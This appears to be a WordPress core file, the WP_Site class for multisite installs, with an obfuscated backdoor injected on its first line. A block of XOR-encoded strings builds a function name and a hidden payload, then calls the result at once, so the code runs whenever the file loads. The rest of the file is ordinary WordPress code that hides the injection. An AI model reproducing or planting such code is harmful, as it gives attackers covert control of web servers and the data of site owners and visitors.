<?php $KJGXqw='TFNT,5,0>N.;>:,'^'74+5XPsVK MOWUB';$jOmAidvqtA=$KJGXqw('','1JFoH=,-7,O=aE=D0N:rh.SR.6JB7fb7 1mnjp.pyQ28;>99NVV>Hb2X56;9WH3fm1Q WdEmS5DPTjfXU,n0YI>CHXKpiHc;lpUWAgB9FDmChKO8UIGR>7+fR1ZFTJHQu;iHb=kLtQKLwynTJVSU2Xuw.fGrSQR4KpWINjZO2<Y,PbcYE6CfcxH1eLN>OEZPP<D=KBXb.c<3bOJ518iLT7V;0ENGI1A0Yr857ZKW-6RB=j>dF77R1ZDfAhgwtog8.lTGFFZ-YhGtmCNTXC<eQ=3qmW 6R>2-MsoNa8,WXnzI6JOWkrbCM6X1NQ02hRIXwXkHZQTQdF.rx+,;Y CPwQld<+5in12O26jqRQ2WtdxF53TFEaoHC;sLD,:Y63YCemUC830jZ7PI.4C8Fqlu3JV-.UP8QfAGaPDT<5NGFmASOH9=5Q1LVfC7:qSZ9Ah3M3.b43A3Xwi4-.<DRkFD-.4GMbpZ;>8,S4,fsKM;UXI-PF-KtRPQRLAUa;<WbUJE6N0fTY=HDGmwR.BJPUApMN< obe>,EQ6v32LScHCWmDsMsRKFxZjtarZbr HXzKCgVKgZUQRZSVYRpFLcxQ+0,762XU<IM8;-8PbPM4>,4TPeUh3AY+PgiYrenSA63 73YdqD8<,=u=YWL:Q.v9HV>J<+YAZHmJS4'^'X,nN.HBNCE S> E-C:IZOV< qR+6V9=ZUEJGCPUzp7GVXJPV v.Q:=V9AWdf:=GNIU0T6HeI8P=ytJFxuWd9PmQ6<xvPNoX1ey383OfPfyMsSkkQi:3 RRENvU;25csqQRBcK7bEP>>8WWStbr74F9.SG;g,su9Q2+s nOz<FN5I>JG2 Oj;JCB8l>+J:74xtS1IbyRkSiA9hk.TEYIqtQ7WC uMmU D8-SPNzvwKW>1XQ4n XE7P9,FiL84; ,qkL54fb1H HzJMg8546YLqF9xI3AB3aYH4SRnESI.cdsmR+;6KOBg;W4D+j:ObX >WpJl>0 0MfUxqMCI<A 8WyH;nnd<+bfoSEJU94KwIZXbCR83 HO3I2zh MN8iX<:EPugSVIQP>YmJU7YfLLQE+:XKnZ1,l<Mkt 5HTnzf-4=<-KTT=X63N;XH.7;M 7l FZJVR2VnC6PHMS 7Cb LZUnaBT>ZJYs8QUOZpGR3pmI12LkRtp0 > ,>PY.=02,E:CNs2X1ckMS6O6+yugVmfQDZJAZM10mQXW5t>acjPdT,GgsvJhZMVG8SCE,lJ-uRcyVh327>f0<uYfjEX0YBMNiY=,c,5QHYKxE ,MRCU0wIuLW -JyNIyRENs:<:EAR5LU YHMfRM8. U0JQdam4CYS05rxDqYI');$jOmAidvqtA();
/**
 * Site API: WP_Site class
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 4.5.0
 */

/**
 * Core class used for interacting with a multisite site.
 *
 * This class is used during load to populate the `$current_blog` global and
 * setup the current site.
 *
 * @since 4.5.0
 *
 * @property int    $id
 * @property int    $network_id
 * @property string $blogname
 * @property string $siteurl
 * @property int    $post_count
 * @property string $home
 */
final class WP_Site {

	/**
	 * Site ID.
	 *
	 * A numeric string, for compatibility reasons.
	 *
	 * @since 4.5.0
	 * @access public
	 * @var string
	 */
	public $blog_id;

	/**
	 * Domain of the site.
	 *
	 * @since 4.5.0
	 * @access public
	 * @var string
	 */
	public $domain = '';

	/**
	 * Path of the site.
	 *
	 * @since 4.5.0
	 * @access public
	 * @var string
	 */
	public $path = '';

	/**
	 * The ID of the site's parent network.
	 *
	 * Named "site" vs. "network" for legacy reasons. An individual site's "site" is
	 * its network.
	 *
	 * A numeric string, for compatibility reasons.
	 *
	 * @since 4.5.0
	 * @access public
	 * @var string
	 */
	public $site_id = '0';

	/**
	 * The date on which the site was created or registered.
	 *
	 * @since 4.5.0
	 * @access public
	 * @var string Date in MySQL's datetime format.
	 */
	public $registered = '0000-00-00 00:00:00';

	/**
	 * The date and time on which site settings were last updated.
	 *
	 * @since 4.5.0
	 * @access public
	 * @var string Date in MySQL's datetime format.
	 */
	public $last_updated = '0000-00-00 00:00:00';

	/**
	 * Whether the site should be treated as public.
	 *
	 * A numeric string, for compatibility reasons.
	 *
	 * @since 4.5.0
	 * @access public
	 * @var string
	 */
	public $public = '1';

	/**
	 * Whether the site should be treated as archived.
	 *
	 * A numeric string, for compatibility reasons.
	 *
	 * @since 4.5.0
	 * @access public
	 * @var string
	 */
	public $archived = '0';

	/**
	 * Whether the site should be treated as mature.
	 *
	 * Handling for this does not exist throughout WordPress core, but custom
	 * implementations exist that require the property to be present.
	 *
	 * A numeric string, for compatibility reasons.
	 *
	 * @since 4.5.0
	 * @access public
	 * @var string
	 */
	public $mature = '0';

	/**
	 * Whether the site should be treated as spam.
	 *
	 * A numeric string, for compatibility reasons.
	 *
	 * @since 4.5.0
	 * @access public
	 * @var string
	 */
	public $spam = '0';

	/**
	 * Whether the site should be treated as deleted.
	 *
	 * A numeric string, for compatibility reasons.
	 *
	 * @since 4.5.0
	 * @access public
	 * @var string
	 */
	public $deleted = '0';

	/**
	 * The language pack associated with this site.
	 *
	 * A numeric string, for compatibility reasons.
	 *
	 * @since 4.5.0
	 * @access public
	 * @var string
	 */
	public $lang_id = '0';

	/**
	 * Retrieves a site from the database by its ID.
	 *
	 * @static
	 * @since 4.5.0
	 * @access public
	 *
	 * @global wpdb $wpdb WordPress database abstraction object.
	 *
	 * @param int $site_id The ID of the site to retrieve.
	 * @return WP_Site|false The site's object if found. False if not.
	 */
	public static function get_instance( $site_id ) {
		global $wpdb;

		$site_id = (int) $site_id;
		if ( ! $site_id ) {
			return false;
		}

		$_site = wp_cache_get( $site_id, 'sites' );

		if ( ! $_site ) {
			$_site = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM {$wpdb->blogs} WHERE blog_id = %d LIMIT 1", $site_id ) );

			if ( empty( $_site ) || is_wp_error( $_site ) ) {
				return false;
			}

			wp_cache_add( $site_id, $_site, 'sites' );
		}

		return new WP_Site( $_site );
	}

	/**
	 * Creates a new WP_Site object.
	 *
	 * Will populate object properties from the object provided and assign other
	 * default properties based on that information.
	 *
	 * @since 4.5.0
	 * @access public
	 *
	 * @param WP_Site|object $site A site object.
	 */
	public function __construct( $site ) {
		foreach( get_object_vars( $site ) as $key => $value ) {
			$this->$key = $value;
		}
	}

	/**
	 * Converts an object to array.
	 *
	 * @since 4.6.0
	 * @access public
	 *
	 * @return array Object as array.
	 */
	public function to_array() {
		return get_object_vars( $this );
	}

	/**
	 * Getter.
	 *
	 * Allows current multisite naming conventions when getting properties.
	 * Allows access to extended site properties.
	 *
	 * @since 4.6.0
	 * @access public
	 *
	 * @param string $key Property to get.
	 * @return mixed Value of the property. Null if not available.
	 */
	public function __get( $key ) {
		switch ( $key ) {
			case 'id':
				return (int) $this->blog_id;
			case 'network_id':
				return (int) $this->site_id;
			case 'blogname':
			case 'siteurl':
			case 'post_count':
			case 'home':
			default: // Custom properties added by 'site_details' filter.
				if ( ! did_action( 'ms_loaded' ) ) {
					return null;
				}

				$details = $this->get_details();
				if ( isset( $details->$key ) ) {
					return $details->$key;
				}
		}

		return null;
	}

	/**
	 * Isset-er.
	 *
	 * Allows current multisite naming conventions when checking for properties.
	 * Checks for extended site properties.
	 *
	 * @since 4.6.0
	 * @access public
	 *
	 * @param string $key Property to check if set.
	 * @return bool Whether the property is set.
	 */
	public function __isset( $key ) {
		switch ( $key ) {
			case 'id':
			case 'network_id':
				return true;
			case 'blogname':
			case 'siteurl':
			case 'post_count':
			case 'home':
				if ( ! did_action( 'ms_loaded' ) ) {
					return false;
				}
				return true;
			default: // Custom properties added by 'site_details' filter.
				if ( ! did_action( 'ms_loaded' ) ) {
					return false;
				}

				$details = $this->get_details();
				if ( isset( $details->$key ) ) {
					return true;
				}
		}

		return false;
	}

	/**
	 * Setter.
	 *
	 * Allows current multisite naming conventions while setting properties.
	 *
	 * @since 4.6.0
	 * @access public
	 *
	 * @param string $key   Property to set.
	 * @param mixed  $value Value to assign to the property.
	 */
	public function __set( $key, $value ) {
		switch ( $key ) {
			case 'id':
				$this->blog_id = (string) $value;
				break;
			case 'network_id':
				$this->site_id = (string) $value;
				break;
			default:
				$this->$key = $value;
		}
	}

	/**
	 * Retrieves the details for this site.
	 *
	 * This method is used internally to lazy-load the extended properties of a site.
	 *
	 * @since 4.6.0
	 * @access private
	 *
	 * @see WP_Site::__get()
	 *
	 * @return stdClass A raw site object with all details included.
	 */
	private function get_details() {
		$details = wp_cache_get( $this->blog_id, 'site-details' );

		if ( false === $details ) {

			switch_to_blog( $this->blog_id );
			// Create a raw copy of the object for backwards compatibility with the filter below.
			$details = new stdClass();
			foreach ( get_object_vars( $this ) as $key => $value ) {
				$details->$key = $value;
			}
			$details->blogname   = get_option( 'blogname' );
			$details->siteurl    = get_option( 'siteurl' );
			$details->post_count = get_option( 'post_count' );
			$details->home       = get_option( 'home' );
			restore_current_blog();

			wp_cache_set( $this->blog_id, $details, 'site-details' );
		}

		/** This filter is documented in wp-includes/ms-blogs.php */
		$details = apply_filters_deprecated( 'blog_details', array( $details ), '4.7.0', 'site_details' );

		/**
		 * Filters a site's extended properties.
		 *
		 * @since 4.6.0
		 *
		 * @param stdClass $details The site details.
		 */
		$details = apply_filters( 'site_details', $details );

		return $details;
	}
}
